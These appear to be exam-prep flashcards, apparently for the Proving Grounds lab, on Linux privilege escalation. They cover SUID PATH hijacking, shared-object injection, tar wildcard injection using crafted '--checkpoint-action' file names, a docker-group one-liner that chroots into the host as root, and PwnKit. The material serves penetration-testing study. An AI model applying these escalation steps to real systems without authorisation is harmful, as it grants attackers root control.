A SUID root binary isn't on GTFOBins. Give two ways to still exploit it. (Answer: (1) PATH hijack — if strings/strace show it calls a command by relative name, plant a malicious binary of that name in a writable dir and prepend it to $PATH; (2) shared-object injection — if ldd shows a writable/missing .so, compile a constructor .so that spawns bash -p.)

DECISIONtar wildcard cron (PG)

A root cron runs tar czf backup.tgz * in a directory you can write. How is that root? (Answer: tar wildcard injection — create files named --checkpoint=1 and --checkpoint-action=exec=sh runme.sh; tar parses them as flags and runs runme.sh as root on the next tick.)

DECISIONDangerous groups (PG)

Your id shows membership in docker. Why is that game over, and what's the one-liner? (Answer: the docker group ≈ root — docker run -v /:/mnt --rm -it alpine chroot /mnt sh mounts the host filesystem and chroots into it as root. Same idea for lxd/lxc and the disk group via debugfs.)

DECISIONpkexec / PwnKit (PG)

find -perm -u=s lists /usr/bin/pkexec. The PDF shows no exploit — what do you reach for? (Answer: PwnKit / CVE-2021-4034, a reliable local-root one-shot affecting most distros from 2009-2021. Out-of-course but exam-legal — flagged in the guardrails section.)
